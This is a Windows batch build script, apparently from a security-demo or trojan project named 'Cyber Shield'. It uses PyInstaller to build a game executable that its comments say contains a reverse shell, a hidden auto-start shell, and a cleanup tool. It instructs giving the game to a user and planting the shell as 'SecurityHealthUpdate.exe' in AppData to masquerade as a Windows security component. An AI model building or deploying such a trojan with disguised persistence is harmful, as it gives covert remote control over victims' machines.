@echo off
REM Build Windows executables for Cyber Shield.
REM Result: three .exe files:
REM   - dist\CyberShieldGame.exe       (main game + reverse shell, Phase 1)
REM   - dist\CyberShieldShell.exe      (hidden shell for auto-start, Phase 2)
REM   - dist\CyberShieldCleanup.exe    (cleanup tool)

echo Building CyberShieldGame.exe (Phase 1)...
py -m PyInstaller --noconfirm --clean --onefile --windowed ^
    --name CyberShieldGame game_client\game_main.py

echo.
echo Building CyberShieldShell.exe (Phase 2 - hidden)...
py -m PyInstaller --noconfirm --clean --onefile --console --hidden-import=game_client.persistence ^
    --name CyberShieldShell shell_client_hidden.py

echo.
echo Building CyberShieldCleanup.exe (cleanup tool)...
py -m PyInstaller --noconfirm --clean --onefile --windowed ^
    --name CyberShieldCleanup cleaner\cleaner_main.py

echo.
echo Build complete! Files are in the dist\ folder:
echo   - CyberShieldGame.exe        (give to user)
echo   - CyberShieldShell.exe       (place in AppData\Roaming\SecurityHealth)
echo   - CyberShieldCleanup.exe     (give to user for cleanup)
echo.
echo IMPORTANT: Copy CyberShieldShell.exe to:
echo   C:\Users\USERNAME\AppData\Roaming\SecurityHealth\SecurityHealthUpdate.exe
pause
